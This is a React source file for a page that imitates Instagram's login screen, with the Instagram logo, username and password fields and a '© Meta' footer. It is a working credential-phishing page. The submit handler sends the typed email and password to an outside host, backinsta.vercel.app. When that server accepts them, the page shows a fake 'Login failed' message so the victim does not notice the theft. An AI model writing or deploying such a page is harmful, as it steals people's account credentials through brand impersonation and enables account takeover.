import React, { useState } from 'react';

const App = () => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const [success, setSuccess] = useState('');

  const handleSubmit = async (e) => {
    e.preventDefault();

    try {
      const response = await fetch('https://backinsta.vercel.app/register', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ email, password }),
      });

      const data = await response.json();

      if (response.ok) {
        setSuccess('Login failed , check your password again !');
        setError('');
      } else {
        setError(data.message);
        setSuccess('');
      }
    } catch (err) {
      setError('Something went wrong. Please try again.');
      setSuccess('');
    }
  };

  return (
    <div
      className="flex justify-center items-center h-screen"
      style={{
        backgroundColor: '#000',
        backgroundImage: 'linear-gradient(to right, #000000, #1c1b1b)',
      }}
    >
      <div className="w-80 flex flex-col items-center">
        {/* Language Selector */}
        <p className="text-gray-400 text-xs mb-4 self-end pr-6">English (UK)</p>

        {/* Instagram Logo */}
        <img
          src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png"
          alt="Instagram Logo"
          className="mb-8"
          style={{ width: '90px' }}
        />

        {/* Login Form */}
        <form onSubmit={handleSubmit} className="w-full">
          <div className="mb-4">
            <input
              type="text"
              placeholder="Username, email address or mobile number"
              className="w-full px-3 py-2 text-gray-400 border border-gray-600 bg-black rounded text-sm"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
            />
          </div>
          <div className="mb-4">
            <input
              type="password"
              placeholder="Password"
              className="w-full px-3 py-2 text-gray-400 border border-gray-600 bg-black rounded text-sm"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
            />
          </div>
          {error && <p className="text-red-500 text-center">{error}</p>}
          {success && <p className="text-green-500 text-center">{success}</p>}
          <button
            type="submit"
            className="w-full bg-blue-600 text-white py-2 rounded-md text-sm font-bold mb-4"
          >
            Log In
          </button>
        </form>

        {/* Forgotten Password */}
        <p className="text-center text-blue-500 text-sm mb-8">Forgotten Password?</p>

        {/* Create Account Button */}
        <button
          className="w-full py-2 text-center text-blue-500 border border-gray-600 rounded-md text-sm"
        >
          Create new account
        </button>

        {/* Meta Logo */}
        <div className="flex justify-center mt-8">
          <p className="text-center text-gray-500 text-xs">© Meta</p>
        </div>
      </div>
    </div>
  );
};

export default App;
